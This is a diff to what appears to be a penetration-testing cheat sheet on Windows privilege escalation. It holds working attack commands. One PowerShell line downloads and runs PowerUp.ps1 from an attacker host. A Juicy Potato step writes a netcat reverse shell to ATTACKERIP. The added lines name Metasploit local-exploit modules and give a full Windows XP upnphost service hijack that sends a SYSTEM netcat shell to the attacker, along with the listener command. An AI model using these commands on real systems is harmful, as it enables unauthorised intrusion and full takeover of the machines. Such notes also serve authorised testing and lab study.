@@ -18,6 +18,19 @@ https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKERIP/PowerUp.ps1');Invoke-AllChecks"
 ```
 
+### MSF enumeration
+
+```
+//weak services permissions
+exploit/windows/local/service_permissions
+
+//Always installed elevated
+exploit/windows/local/always_install_elevated
+
+//Unattend
+post/windows/gather/enum_unattend`
+```
+
 ## Exploits
 
 ### Juicy potato
@@ -50,3 +63,22 @@ echo c:\Users\Public\Documents\nc.exe -e cmd.exe ATTACKERIP 1340 > rev.bat
 juicypotato.exe -l 1340 -t * -p c:\Users\Public\Documents\rev.bat
 
 ```
+
+### Windows XP SP1 is known to be vulnerable to PE in upnphost. 
+
+You get Administrator with:
+```
+VICTIM MACHINE
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+
+// If it fails because of a missing dependency, run the following:
+sc config SSDPSRV start= auto
+net start SSDPSRV
+net start upnphost
+
+ATTACKER MACHINE
+nc -lvpn 1234
+```
+
